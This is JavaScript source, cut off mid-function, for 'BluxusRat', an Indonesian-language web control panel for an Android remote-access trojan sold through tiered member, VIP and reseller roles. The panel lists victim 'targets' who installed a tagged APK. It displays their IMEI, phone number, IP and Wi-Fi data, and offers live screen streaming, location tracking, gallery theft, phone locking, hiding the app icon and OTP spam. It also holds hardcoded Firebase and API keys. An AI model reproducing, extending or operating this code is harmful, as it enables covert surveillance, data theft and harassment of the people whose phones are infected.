/* ============================================================
   BluxusRat V1 [NewEra] — script.js (Patch 6)
   ============================================================ */

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getDatabase, ref, set, push, update, onValue, get, remove } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-database.js";

const firebaseConfig = { apiKey: "AIzaSyBx7iNsKzUjiZh-cVnfw3Tl8AYPz_xjH7A", authDomain: "ratt-ceee0.firebaseapp.com", databaseURL: "https://ratt-ceee0-default-rtdb.asia-southeast1.firebasedatabase.app", projectId: "ratt-ceee0", storageBucket: "ratt-ceee0.firebasestorage.app", messagingSenderId: "767485162301", appId: "1:767485162301:web:3800f71fc8c6bb35db8b54" };
const fbApp = initializeApp(firebaseConfig);
const fbDB = getDatabase(fbApp);

const CONFIG = { FAZZ_KEY: "fcs_live_ff8116a26bea56e04330d6c249a26c3c88e9d4f1", FAZZ_API: "https://api.fazzcode.eu.cc/api", TERMAI_KEY: "AIzaBj7z2z3xBjsk", TERMAI_URL: "https://c.termai.cc", ANIME_API: "https://apii.nexadev.my.id/anime", ANIME_BANNER: "https://api.nexadev.my.id/api/random/anime", MAX_UPLOAD: 5 * 1024 * 1024, WA_ADMIN: "6283137236898", WA_CHANNEL: "https://whatsapp.com/channel/0029VbD9HztKrWQuuymMCU0w", WA_GROUP: "https://chat.whatsapp.com/ImF67mLQSnZ8xYwKpMO4EU" };

const PRICE_DATA = {
  member: { label: "Member", icon: "fa-user", tagline: "Role dasar", desc: "Role paling dasar di BluxusRat.", benefits: ["Akses Tools reguler","Akses BluxAnime","Kontrol device target","Support komunitas","Update fitur rutin"] },
  vip: { label: "VIP", icon: "fa-crown", tagline: "Tools tambahan", desc: "VIP akses semua fitur Member + VIP Tools (Spam OTP).", benefits: ["Semua benefit Member","Akses VIP Tools","Priority support","Badge VIP","Akses beta fitur","Hide App","Toast unlimited","Lock HP","URL Direct"] },
  reseller: { label: "Reseller", icon: "fa-briefcase", tagline: "Bisa bikin akun", desc: "Reseller bisa bikin akun Member & VIP. Limit 5/hari.", benefits: ["Semua benefit VIP","Bikin akun Member & VIP","Limit 5/hari","Statistics bawahan","Perpanjang expired","Support prioritas","Badge Reseller"] },
  owner: { label: "Owner", icon: "fa-shield-halved", tagline: "Kelola sistem", desc: "Owner akses lebih luas.", benefits: ["Semua benefit Reseller","Unlimited bikin akun","Broadcast","Server logs","Maintenance","Reset password user","Ban/unban user","Statistics global","Support tertinggi","Badge Owner","Akses penuh"] }
};

const FAQ_DATA = [
  { q: "Apa itu BluxusRat?", a: "Control panel untuk monitoring & kontrol device." },
  { q: "Bagaimana cara upgrade role?", a: "Hubungi Owner atau Reseller resmi." },
  { q: "Apa beda VIP sama Member?", a: "VIP punya akses VIP Tools (Spam OTP) + fitur advanced." },
  { q: "Apa beda Reseller sama VIP?", a: "Reseller bisa bikin akun Member & VIP." },
  { q: "Kenapa akun gw expired?", a: "Masa aktif udah lewat. Hubungi Owner/Reseller." },
  { q: "Fitur Live Cam kok gak muncul?", a: "Live Cam support semua versi Android." },
  { q: "Kenapa target gw gak muncul?", a: "Target muncul kalo dia install APK dengan userCode sesuai." },
  { q: "Apa itu userCode?", a: "Kode unik yang nentuin target masuk ke akun lo." },
  { q: "Gimana cara hubungi Owner?", a: "Buka About → klik 'Yummy' atau join channel WA." }
];

const ROLE_PERMS = {
  dev: { panel: [{id:"add_user",name:"Add User",icon:"fa-user-plus"},{id:"manage_user",name:"Manage User",icon:"fa-users-gear"},{id:"ban_user",name:"Ban User",icon:"fa-ban"},{id:"reset_pw",name:"Reset Password",icon:"fa-key"},{id:"broadcast",name:"Broadcast",icon:"fa-bullhorn"},{id:"stats",name:"Statistics",icon:"fa-chart-line"},{id:"logs",name:"Server Logs",icon:"fa-file-lines"}] },
  owner: { panel: [{id:"add_user",name:"Add User",icon:"fa-user-plus"},{id:"broadcast",name:"Broadcast",icon:"fa-bullhorn"},{id:"logs",name:"Server Logs",icon:"fa-file-lines"}] },
  reseller: { panel: [{id:"add_user",name:"Add User",icon:"fa-user-plus"},{id:"extend_user",name:"Extend User",icon:"fa-clock-rotate-left"},{id:"stats",name:"Statistics",icon:"fa-chart-line"}] },
  vip: { panel: [] },
  member: { panel: [] }
};

const CREATE_PERMS = { dev: ["owner","reseller","vip","member"], owner: ["reseller","vip","member"], reseller: ["member","vip"], vip: [], member: [] };

const CHANGELOG_DATA = [
  { patch: 6, date: "Sedang Berjalan", latest: true, changes: [
    { type: "rem", text: "Sistem Ekonomi & Beli Akses" },
    { type: "add", text: "Fitur Change Wallpaper target" },
    { type: "add", text: "Fitur Spam UI (max 10 foto)" },
    { type: "fix", text: "Strobo cuma kedip 1x → kedip terus" },
    { type: "fix", text: "Get Gallery cuma 1-2 foto → munculin semua" },
    { type: "fix", text: "Kirim Toast delay parah → real-time" },
    { type: "fix", text: "Hide App gak work → 3-metode fallback" },
    { type: "imp", text: "Info Device → tampilan Card-Grid" },
    { type: "imp", text: "Live Cam → WebRTC + FPS + semua Android" },
    { type: "imp", text: "Locate → reverse geocoding + alamat lengkap" },
    { type: "imp", text: "Kunci HP → custom pesan + tampilan baru" },
    { type: "imp", text: "Animasi loading di semua fitur" }
  ]},
  { patch: 5, date: "Sebelumnya", latest: false, changes: [
    { type: "fix", text: "OTP Gmail tidak terkirim" },
    { type: "fix", text: "Tombol verifikasi Ekonomi" },
    { type: "fix", text: "Tombol hapus target" },
    { type: "fix", text: "Icon senter hilang" },
    { type: "add", text: "Changelog di sidebar" },
    { type: "add", text: "Kirim Toast ke target" },
    { type: "add", text: "Hide App di target" }
  ]},
  { patch: 4, date: "Sebelumnya", latest: false, changes: [
    { type: "fix", text: "Kecerahan target" },
    { type: "fix", text: "Lock HP overlay" },
    { type: "fix", text: "Gallery base64" },
    { type: "add", text: "Set Volume" },
    { type: "add", text: "Set Kecerahan" },
    { type: "add", text: "URL Direct" }
  ]},
  { patch: 3, date: "Sebelumnya", latest: false, changes: [
    { type: "add", text: "Firebase config dienkripsi Java" },
    { type: "add", text: "Bridge getFirebaseConfig()" }
  ]},
  { patch: 2, date: "Sebelumnya", latest: false, changes: [
    { type: "add", text: "Live Cam (Android 11+)" },
    { type: "add", text: "Senter & Strobo" },
    { type: "add", text: "Locate" },
    { type: "add", text: "Info Device" }
  ]},
  { patch: 1, date: "Rilis Awal", latest: false, changes: [
    { type: "new", text: "Rilis pertama BluxusRat" },
    { type: "new", text: "Login SHA-256" },
    { type: "new", text: "Dashboard & Sidebar" },
    { type: "new", text: "Rat target management" },
    { type: "new", text: "BluxAnime streaming" }
  ]}
];

const State = { user: null, uid: null, page: "dash", targets: [], unsubLive: null, unsubLoc: null, unsubGallery: null, currentTarget: null, currentFeature: null, audio: null, currentTrack: null, animeSearchMode: false, animeCurrentDetail: null, db: fbDB, spamuiFiles: [] };

const LOADING_TEXTS = ["Connecting to Firebase...", "Loading assets...", "Preparing session...", "Almost ready..."];
const $ = (s, p = document) => p.querySelector(s);
const $$ = (s, p = document) => [...p.querySelectorAll(s)];
const fbRef = ref, fbSet = set, fbPush = push, fbUpdate = update, fbOnValue = onValue, fbGet = get, fbRemove = remove;

function haptic(ms = 10) { try { if (navigator.vibrate) navigator.vibrate(ms); } catch (e) {} }
function isVIP() { return State.user && ["vip", "reseller", "owner", "dev"].includes(State.user.role); }
function getDeviceName(t) { if (!t) return "Unknown Device"; if (t.brand && t.brand !== "Unknown" && t.brand !== "") return t.brand.charAt(0).toUpperCase() + t.brand.slice(1).toLowerCase(); if (t.model && t.model !== "Unknown") return t.model; return "Unknown Device"; }
function showScreen(id) { $$(".screen").forEach(s => s.classList.remove("active")); const el = $("#screen-" + id); if (el) el.classList.add("active"); }

function toast(msg, type = "info", dur = 3000) {
  const wrap = $("#toast-wrap");
  const el = document.createElement("div");
  el.style.cssText = "padding:14px 16px;background:#1e1215;border:1px solid rgba(255,255,255,0.06);border-radius:14px;font-size:12px;font-weight:600;color:#f5f5f5;box-shadow:0 12px 32px rgba(0,0,0,0.6);animation:toastIn .4s;pointer-events:auto;display:flex;align-items:center;gap:12px;margin-bottom:8px";
  const ic = type === "ok" ? "fa-circle-check" : type === "err" ? "fa-circle-xmark" : type === "warn" ? "fa-triangle-exclamation" : "fa-circle-info";
  const col = type === "ok" ? "#2ed573" : type === "err" ? "#ff3333" : type === "warn" ? "#ffa502" : "#70a1ff";
  el.innerHTML = `<i class="fa-solid ${ic}" style="color:${col}"></i><span>${msg}</span>`;
  wrap.appendChild(el);
  setTimeout(() => { el.style.opacity = "0"; el.style.transform = "translateY(-12px) scale(.95)"; el.style.transition = ".3s"; setTimeout(() => el.remove(), 300); }, dur);
}

function fmtDate(ts) { if (!ts) return "—"; return new Date(ts).toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" }); }
function fmtDateTime(ts) { if (!ts) return "—"; const d = new Date(ts); return d.toLocaleDateString("id-ID", { day: "2-digit", month: "short", year: "numeric" }) + " " + d.toLocaleTimeString("id-ID", { hour: "2-digit", minute: "2-digit" }); }
function fmtTime(ts) { const d = new Date(ts); return `${String(d.getHours()).padStart(2,"0")}:${String(d.getMinutes()).padStart(2,"0")}:${String(d.getSeconds()).padStart(2,"0")}`; }
function timeAgo(ts) { if (!ts) return "—"; const s = Math.floor((Date.now() - ts) / 1000); if (s < 60) return s + "s ago"; if (s < 3600) return Math.floor(s / 60) + "m ago"; if (s < 86400) return Math.floor(s / 3600) + "h ago"; return Math.floor(s / 86400) + "d ago"; }
function cleanTitle(t) { if (!t) return ""; return t.split("\t")[0].trim(); }

async function sha256(text) { const buf = new TextEncoder().encode(text); const hash = await crypto.subtle.digest("SHA-256", buf); return [...new Uint8Array(hash)].map(b => b.toString(16).padStart(2,"0")).join(""); }
function genSalt() { const arr = new Uint8Array(16); crypto.getRandomValues(arr); return [...arr].map(b => b.toString(16).padStart(2,"0")).join(""); }
function genUserCode() { const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"; const gen = () => [...crypto.getRandomValues(new Uint8Array(4))].map(b => chars[b % chars.length]).join(""); return `${gen()}-${gen()}-${gen()}-${gen()}`; }
function genPassword(len = 8) { const chars = "abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789"; return [...crypto.getRandomValues(new Uint8Array(len))].map(b => chars[b % chars.length]).join(""); }

async function copyToClipboard(text) {
  try { if (navigator.clipboard && window.isSecureContext) { await navigator.clipboard.writeText(text); return true; } } catch (e) {}
  try { const ta = document.createElement("textarea"); ta.value = text; ta.style.position = "fixed"; ta.style.left = "-9999px"; document.body.appendChild(ta); ta.select(); const ok = document.execCommand("copy"); document.body.removeChild(ta); return ok; } catch (e) { return false; }
}

async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const fd = new FormData();
    fd.append("file", file, file.name);
    const xhr = new XMLHttpRequest();
    xhr.open("POST", `${CONFIG.TERMAI_URL}/api/upload?key=${CONFIG.TERMAI_KEY}`);
    xhr.onload = () => {
      try {
        const r = JSON.parse(xhr.responseText);
        if (r.status && r.path) resolve(r.path);
        else reject(new Error(r.message || "Upload gagal"));
      } catch (e) { reject(e); }
    };
    xhr.onerror = () => reject(new Error("Koneksi error"));
    xhr.send(fd);
  });
}

function setDot(s) { const d = $("#conn-dot"); if (!d) return; d.classList.remove("warn","off"); if (s === "warn") d.classList.add("warn"); if (s === "off") d.classList.add("off"); }
function showOffline() { $("#offline-popup").classList.add("show"); }
function hideOffline() { $("#offline-popup").classList.remove("show"); }
window.addEventListener("offline", () => { setDot("off"); showOffline(); });
window.addEventListener("online", () => { setDot("ok"); hideOffline(); });

function watchConnection() {
  fbOnValue(fbRef(State.db, ".info/connected"), (snap) => { if (snap.val() === true) { setDot("ok"); hideOffline(); } else { setDot("warn"); } });
  setInterval(() => { if (!navigator.onLine) { setDot("off"); showOffline(); } else if ($("#offline-popup").classList.contains("show")) { hideOffline(); } }, 3000);
  setInterval(() => { const el = $("#offline-last-check"); if (el) { const d = new Date(); el.textContent = `${String(d.getHours()).padStart(2,"0")}:${String(d.getMinutes()).padStart(2,"0")}:${String(d.getSeconds()).padStart(2,"0")}`; } }, 1000);
}

function runLoading() {
  showScreen("loading");
  const fill = $("#progress-fill"), txt = $("#loading-text");
  fill.style.width = "0%";
  let idx = 0; txt.textContent = LOADING_TEXTS[0];
  let pct = 0;
  const step = setInterval(() => { pct += Math.random() * 12 + 4; if (pct >= 100) { pct = 100; clearInterval(step); } fill.style.width = pct + "%"; }, 180);
  const ltxt = setInterval(() => { idx = (idx + 1) % LOADING_TEXTS.length; txt.style.opacity = "0"; setTimeout(() => { txt.textContent = LOADING_TEXTS[idx]; txt.style.opacity = "1"; }, 180); }, 800);
  setTimeout(() => { clearInterval(ltxt); fill.style.width = "100%"; setTimeout(() => showScreen("login"), 500); }, 2400);
}

async function doLogin() {
  haptic(15);
  const usn = $("#login-usn").value.trim(), pw = $("#login-pw").value;
  if (!usn || !pw) return toast("Isi username & password", "err");
  const btn = $("#btn-login");
  btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Loading...';
  try {
    const snap = await fbGet(fbRef(State.db, "users"));
    if (!snap.exists()) throw new Error("Belum ada user terdaftar");
    const users = snap.val();
    let foundUid = null, foundUser = null;
    for (const uid in users) { if (users[uid].username === usn) { foundUid = uid; foundUser = users[uid]; break; } }
    if (!foundUser) throw new Error("Username tidak ditemukan");
    if (foundUser.banned) throw new Error("Akun di-ban");
    const hash = await sha256(pw + foundUser.passwordSalt);
    if (hash !== foundUser.passwordHash) throw new Error("Password salah");
    if (foundUser.expiresAt && foundUser.expiresAt < Date.now()) throw new Error("Akun expired");
    await fbUpdate(fbRef(State.db, "users/" + foundUid), { lastLogin: Date.now() });
    State.uid = foundUid; State.user = foundUser;
    localStorage.setItem("bluxus_uid", foundUid);
    toast("Login berhasil", "ok");
    setTimeout(() => goDashboard(), 400);
  } catch (e) { toast(e.message || "Login gagal", "err"); }
  finally { btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-right-to-bracket"></i> Login'; }
}

async function tryResume() {
  const uid = localStorage.getItem("bluxus_uid");
  if (!uid) return false;
  try {
    const snap = await fbGet(fbRef(State.db, "users/" + uid));
    if (!snap.exists()) return false;
    const u = snap.val();
    if (u.banned) return false;
    if (u.expiresAt && u.expiresAt < Date.now()) return false;
    State.uid = uid; State.user = u; return true;
  } catch (e) { return false; }
}

async function goDashboard() {
  showScreen("dash");
  const u = State.user || {};
  $("#dash-usn").textContent = u.username || "—";
  const role = u.role || "member";
  const roleEl = $("#dash-role");
  roleEl.className = "role " + role;
  roleEl.innerHTML = `<i class="fa-solid fa-user"></i> ${role}`;
  $("#dash-usercode").textContent = u.userCode || "—";
  $("#dash-welcome-name").textContent = u.username || "User";
  const badge = $("#dash-badge");
  badge.textContent = role.toUpperCase();
  badge.className = "wb-badge " + role;
  $("#sb-sub").textContent = u.username || "—";
  if (["dev","owner","reseller"].includes(role)) { $("#sb-role-sep").classList.remove("hidden"); $("#sb-panel").classList.remove("hidden"); } else { $("#sb-role-sep").classList.add("hidden"); $("#sb-panel").classList.add("hidden"); }
  markSidebar("dash");
  await loadTargets();
  loadAnnouncement();
}

function markSidebar(page) { $$(".sb-item").forEach(el => { const isActive = el.dataset.page === page; el.classList.toggle("active", isActive); }); }
function openSidebar() { haptic(8); $("#sidebar").classList.add("open"); $("#sidebar-backdrop").classList.add("show"); }
function closeSidebar() { $("#sidebar").classList.remove("open"); $("#sidebar-backdrop").classList.remove("show"); }

function goPage(page) {
  haptic(8); closeSidebar(); markSidebar(page); State.page = page;
  if (page === "dash") return goDashboard();
  if (page === "rat") return goRat();
  if (page === "anime") return goAnime();
  if (page === "tools") return goTools();
  if (page === "benefit") return goBenefit();
  if (page === "account") return goAccount();
  if (page === "changelog") return goChangelog();
  if (page === "about") return showScreen("about");
  if (page === "panel") return goPanel();
}

async function loadAnnouncement() {
  const wrap = $("#announce-wrap"); if (!wrap) return;
  try {
    const snap = await fbGet(fbRef(State.db, "broadcasts"));
    if (!snap.exists()) { wrap.innerHTML = ""; return; }
    const arr = Object.entries(snap.val()).map(([id, v]) => ({ id, ...v })).sort((a, b) => b.createdAt - a.createdAt);
    const l = arr[0]; if (!l) { wrap.innerHTML = ""; return; }
    wrap.innerHTML = `<div class="announce-card" id="announce-card">${l.image ? `<img src="${l.image}" onerror="this.style.display='none'" style="position:absolute;inset:0;width:100%;height:100%;object-fit:cover;opacity:.4">` : ""}<div style="position:relative;z-index:2;padding:18px;display:flex;flex-direction:column;justify-content:flex-end;min-height:110px"><div style="font-size:9px;font-weight:700;color:#c41e28;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:6px;display:flex;align-items:center;gap:6px"><i class="fa-solid fa-bullhorn"></i> Pengumuman</div><div style="font-family:'Poppins',sans-serif;font-size:15px;font-weight:700;color:#fff;line-height:1.3;margin-bottom:4px">${l.title || "Info Terbaru"}</div><div style="font-size:11px;color:rgba(255,255,255,0.7);line-height:1.4">${l.message || ""}</div></div></div>`;
    $("#announce-card").onclick = () => { haptic(8); if (l.url) { window.open(l.url, "_blank"); return; } openAnnouncementModal(l); };
  } catch (e) {}
}

function openAnnouncementModal(b) {
  const box = $("#modal-box");
  box.innerHTML = `${b.image ? `<div style="border-radius:14px;overflow:hidden;margin:-8px -8px 16px"><img src="${b.image}" style="width:100%;display:block"></div>` : ""}<h3 style="font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">${b.title || "Pengumuman"}</h3><div style="font-size:12px;color:#a39599;margin-bottom:18px;text-align:center">${fmtDateTime(b.createdAt)}</div><div style="font-size:13px;color:#f5f5f5;line-height:1.7;white-space:pre-wrap">${b.message || ""}</div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
  $("#modal").classList.add("show");
}

async function loadTargets() {
  try {
    const snap = await fbGet(fbRef(State.db, "targets"));
    const all = snap.exists() ? snap.val() : {};
    const myCode = State.user.userCode;
    State.targets = [];
    for (const tid in all) { const t = all[tid]; if (t.ownerCode === myCode) State.targets.push({ id: tid, ...t }); }
    State.targets.sort((a, b) => (b.lastSeen || 0) - (a.lastSeen || 0));
    $("#dash-targets").textContent = State.targets.length;
    $("#dash-online").textContent = State.targets.filter(t => t.status === "online").length;
    renderTargetList();
  } catch (e) { console.error("[loadTargets]", e); }
}

function renderTargetList() {
  const list = $("#target-list"); if (!list) return;
  if (State.targets.length === 0) { list.innerHTML = `<div style="text-align:center;padding:30px 20px;color:#a39599"><i class="fa-solid fa-satellite-dish" style="font-size:42px;display:block;margin-bottom:12px;opacity:.3"></i><div style="font-size:12px">Belum ada target</div><div style="font-size:10px;color:#5a4548;margin-top:4px">Kirim APK ke target buat mulai</div></div>`; return; }
  list.innerHTML = State.targets.map(t => {
    const online = t.status === "online", bat = t.battery || 0, low = bat < 20;
    const batIcon = bat > 75 ? "full" : bat > 50 ? "three-quarters" : bat > 25 ? "half" : "quarter";
    return `<div class="target-item" data-tid="${t.id}" style="display:flex;align-items:center;gap:12px;padding:14px;background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:16px;cursor:pointer;margin-bottom:10px"><div style="width:44px;height:44px;border-radius:12px;background:rgba(196,30,40,0.12);display:flex;align-items:center;justify-content:center;flex-shrink:0"><i class="fa-solid fa-mobile-screen" style="font-size:18px;color:#e02630"></i></div><div style="flex:1;min-width:0"><div style="font-family:'Poppins',sans-serif;font-size:14px;font-weight:700;color:#f5f5f5;white-space:nowrap;overflow:hidden;text-overflow:ellipsis">${getDeviceName(t)}</div><div style="font-size:11px;color:#a39599;margin-top:2px;display:flex;gap:8px;flex-wrap:wrap;align-items:center"><span>${t.ip || "—"}</span>${t.battery ? `<span style="display:inline-flex;align-items:center;gap:4px;padding:2px 7px;border-radius:6px;background:${low ? 'rgba(255,51,51,0.12)' : 'rgba(46,213,115,0.12)'};color:${low ? '#ff3333' : '#2ed573'};font-size:10px;font-weight:700"><i class="fa-solid fa-battery-${batIcon}"></i>${bat}%</span>` : ""}<span>${timeAgo(t.lastSeen)}</span></div></div><div style="flex-shrink:0;font-size:10px;font-weight:700;text-transform:uppercase;letter-spacing:.5px;color:${online ? '#2ed573' : '#5a4548'}">${online ? "ON" : "OFF"}</div></div>`;
  }).join("");
  $$(".target-item").forEach(el => el.onclick = () => { haptic(10); openTargetDetail(el.dataset.tid); });
}

function goRat() { showScreen("rat"); $("#rat-usercode").textContent = State.user.userCode || "—"; const btn = $("#btn-copy-usercode"); btn.classList.remove("copied"); btn.innerHTML = '<i class="fa-solid fa-copy"></i>'; loadTargets(); }

const FEATURES = [
  { id: "info", icon: "fa-mobile-screen-button", name: "Info Device", desc: "Detail device target", page: "fp-info" },
  { id: "live", icon: "fa-desktop", name: "Live Cam", desc: "Stream layar target", page: "fp-live" },
  { id: "locate", icon: "fa-location-dot", name: "Locate", desc: "Lokasi target", page: "fp-locate" },
  { id: "flash", icon: "fa-lightbulb", name: "Senter & Strobo", desc: "Kontrol flashlight", page: "fp-flash" },
  { id: "lock", icon: "fa-lock", name: "Kunci HP", desc: "Lock overlay target", page: "fp-lock" },
  { id: "volume", icon: "fa-volume-high", name: "Set Volume", desc: "Atur volume target", page: "fp-volume" },
  { id: "brightness", icon: "fa-sun", name: "Set Kecerahan", desc: "Atur brightness", page: "fp-brightness" },
  { id: "url", icon: "fa-link", name: "URL Direct", desc: "Buka URL di target", page: "fp-url" },
  { id: "gallery", icon: "fa-images", name: "Get Gallery", desc: "Ambil semua foto target", page: "fp-gallery" },
  { id: "toast", icon: "fa-comment-dots", name: "Kirim Toast", desc: "Tampilkan pesan", page: "fp-toast" },
  { id: "hideapp", icon: "fa-eye-slash", name: "Hide App", desc: "Sembunyikan icon APK", page: "fp-hideapp" },
  { id: "wallpaper", icon: "fa-image", name: "Change Wallpaper", desc: "Ganti wallpaper target", page: "fp-wallpaper" },
  { id: "spamui", icon: "fa-layer-group", name: "Spam UI", desc: "Spam foto ke layar target", page: "fp-spamui" }
];

function openTargetDetail(tid) {
  const t = State.targets.find(x => x.id === tid); if (!t) return;
  State.currentTarget = t; State.currentFeature = null;
  $("#target-title").textContent = getDeviceName(t);
  showScreen("target"); renderFeatureGrid(t); closeAllFeaturePages();
}

function renderFeatureGrid(t) {
  const grid = $("#feature-grid");
  grid.innerHTML = FEATURES.map(f => `<div class="feature-card" data-fid="${f.id}" style="background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:16px 14px;display:flex;flex-direction:column;align-items:flex-start;gap:10px;cursor:pointer;box-shadow:0 8px 24px rgba(0,0,0,0.5);position:relative;overflow:hidden"><div style="width:44px;height:44px;border-radius:12px;background:rgba(196,30,40,0.12);display:flex;align-items:center;justify-content:center"><i class="fa-solid ${f.icon}" style="font-size:18px;color:#e02630"></i></div><div style="font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:#f5f5f5;line-height:1.2">${f.name}</div><div style="font-size:10px;color:#a39599;line-height:1.4">${f.desc}</div></div>`).join("") + `<div class="feature-card danger" data-fid="delete" style="background:#160d10;border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:16px 14px;display:flex;flex-direction:column;align-items:flex-start;gap:10px;cursor:pointer"><div style="width:44px;height:44px;border-radius:12px;background:rgba(255,51,51,0.12);display:flex;align-items:center;justify-content:center"><i class="fa-solid fa-trash" style="font-size:18px;color:#ff3333"></i></div><div style="font-family:'Poppins',sans-serif;font-size:13px;font-weight:700;color:#ff3333;line-height:1.2">Hapus Target</div><div style="font-size:10px;color:#a39599;line-height:1.4">Hapus target & semua data</div></div>`;
  $$(".feature-card", grid).forEach(el => { el.onclick = () => { haptic(10); const fid = el.dataset.fid; if (fid === "delete") return confirmDeleteTarget(t); openFeaturePage(fid, t); }; });
}

function openFeaturePage(fid, t) {
  State.currentFeature = fid; closeAllFeaturePages();
  const feat = FEATURES.find(f => f.id === fid); if (!feat) return;
  $("#feature-grid").style.display = "none";
  const page = $("#" + feat.page); if (!page) return;
  page.classList.add("active");
  if (fid === "info") renderInfoPage(t);
  if (fid === "live") renderLivePage(t);
  if (fid === "locate") renderLocatePage(t);
  if (fid === "flash") setupFlashToggles(t);
  if (fid === "lock") setupLockPage(t);
  if (fid === "volume") setupVolumePage(t);
  if (fid === "brightness") setupBrightnessPage(t);
  if (fid === "url") setupUrlPage(t);
  if (fid === "gallery") setupGalleryPage(t);
  if (fid === "toast") setupToastPage(t);
  if (fid === "hideapp") setupHideAppPage(t);
  if (fid === "wallpaper") setupWallpaperPage(t);
  if (fid === "spamui") setupSpamUIPage(t);
}

function closeAllFeaturePages() { $$(".feature-page").forEach(p => p.classList.remove("active")); $("#feature-grid").style.display = "grid"; }

function confirmDeleteTarget(t) {
  const box = $("#modal-box");
  box.innerHTML = `<h3 style="color:#ff3333;font-family:'Poppins',sans-serif;font-size:17px;font-weight:700;margin-bottom:8px;text-align:center">Hapus Target?</h3><div style="font-size:12px;color:#a39599;text-align:center;margin-bottom:14px">Target: <b>${getDeviceName(t)}</b></div><div style="display:flex;align-items:flex-start;gap:10px;padding:12px 14px;background:rgba(255,51,51,0.12);border:1px solid rgba(255,51,51,0.3);border-radius:12px;font-size:11px;color:#a39599;line-height:1.6;margin-bottom:14px"><i class="fa-solid fa-triangle-exclamation" style="color:#ff3333;font-size:14px;margin-top:1px"></i><span>Semua data (commands, live, locations, gallery) akan dihapus permanen.</span></div><div style="display:flex;gap:8px;margin-top:20px"><button class="btn btn-ghost" id="btn-cancel-delete" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:#160d10;color:#f5f5f5;border:1px solid rgba(255,255,255,0.1)">Batal</button><button class="btn btn-danger" id="btn-confirm-delete" style="flex:1;padding:15px;border-radius:12px;font-size:13px;font-weight:700;background:linear-gradient(135deg,#ff3333,#a51010);color:#fff"><i class="fa-solid fa-trash"></i> Hapus</button></div>`;
  $("#modal").classList.add("show");
  $("#btn-cancel-delete").onclick = () => closeModal();
  $("#btn-confirm-delete").onclick = async () => {
    haptic(20);
    const btn = $("#btn-confirm-delete");
    btn.disabled = true; btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Menghapus...';
    try {
      await fbRemove(fbRef(State.db, "targets/" + t.id));
      await fbRemove(fbRef(State.db, "commands/" + t.id));
      await fbRemove(fbRef(State.db, "live/" + t.id));
      await fbRemove(fbRef(State.db, "locations/" + t.id));
      await fbRemove(fbRef(State.db, "gallery/" + t.id));
      toast("Target berhasil dihapus", "ok"); closeModal();
      await loadTargets(); goRat();
    } catch (e) { toast("Gagal hapus: " + e.message, "err"); btn.disabled = false; btn.innerHTML = '<i class="fa-solid fa-trash"></i> Hapus'; }
  };
}

function renderInfoPage(t) {
  const cards = [
    { label: "Status", value: t.status === "online" ? "ONLINE" : "OFFLINE", cls: t.status === "online" ? "online" : "offline", icon: "fa-signal" },
    { label: "Brand", value: t.brand || "—", icon: "fa-tag" },
    { label: "Model", value: t.model || "—", icon: "fa-mobile" },
    { label: "IP Address", value: t.ip || "—", icon: "fa-network-wired" },
    { label: "Android", value: t.android || "—", icon: "fa-android" },
    { label: "SDK", value: t.sdk || "—", icon: "fa-code" },
    { label: "IMEI", value: t.imei || "—", full: true, icon: "fa-id-card" },
    { label: "SIM Operator", value: t.simOperator || "—", icon: "fa-sim-card" },
    { label: "SIM Country", value: t.simCountry || "—", icon: "fa-flag" },
    { label: "Phone Number", value: t.phoneNumber || "—", icon: "fa-phone" },
    { label: "Battery", value: t.battery ? t.battery + "%" : "—", cls: t.battery < 20 ? "warn" : "", icon: "fa-battery-half" },
    { label: "Charging", value: t.charging ? "Ya" : "Tidak", icon: "fa-plug" },
    { label: "Wifi SSID", value: t.wifiSSID || "—", full: true, icon: "fa-wifi" },
    { label: "Carrier", value: t.carrier || "—", icon: "fa-tower-broadcast" },
    { label: "Screen", value: t.screenRes || "—", icon: "fa-display" },
    { label: "RAM Total", value: t.ramTotal ? (parseInt(t.ramTotal)/1073741824).toFixed(2) + " GB" : "—", icon: "fa-memory" },
    { label: "RAM Free", value: t.ramFree ? (parseInt(t.ramFree)/1073741824).toFixed(2) + " GB" : "—", icon: "fa-microchip" },
    { label: "Storage Total", value: t.storageTotal ? (parseInt(t.storageTotal)/1073741824).toFixed(2) + " GB" : "—", icon: "fa-hard-drive" },
    { label: "Storage Free", value: t.storageFree ? (parseInt(t.storageFree)/1073741824).toFixed(2) + " GB" : "—", icon: "fa-database" },
    { label: "Last Seen", value: timeAgo(t.lastSeen), full: true, icon: "fa-clock" }
  ];
  $("#info-content").innerHTML = cards.map(c => `<div class="info-card ${c.full ? 'full' : ''}" style="position:relative"><div class="ic-label">${c.label}</div><div class="ic-value ${c.cls || ''}">${c.value}</div><i class="fa-solid ${c.icon} ic-icon"></i></div>`).join("");
}

function renderLivePage(t) {
  const sw = $("#sw-live"), fps = $("#fps-slider"), fpsVal = $("#fps-value");
  sw.onchange = (e) => toggleLive(t.id, e.target.checked);
  fps.oninput = () => { fpsVal.textContent = fps.value; if (sw.checked) { sendCommand(t.id, "live_on", { fps: parseInt(fps.value) }); } };
}

async function toggleLive(tid, on) {
  haptic(15);
  if (on) {
    const fps = parseInt($("#fps-slider").value) || 2;
    const v = $("#live-view");
    v.innerHTML = '<div class="loading-overlay"><div class="loader"></div><div class="loading-text">Menyambung ke target...</div></div>';
    await sendCommand(tid, "live_on", { fps });
    toast("Live cam aktif", "ok");
    setupLiveScreen(tid);
  } else {
    await sendCommand(tid, "live_off");
    toast("Live cam nonaktif", "info");
    if (State.unsubLive) { State.unsubLive(); State.unsubLive = null; }
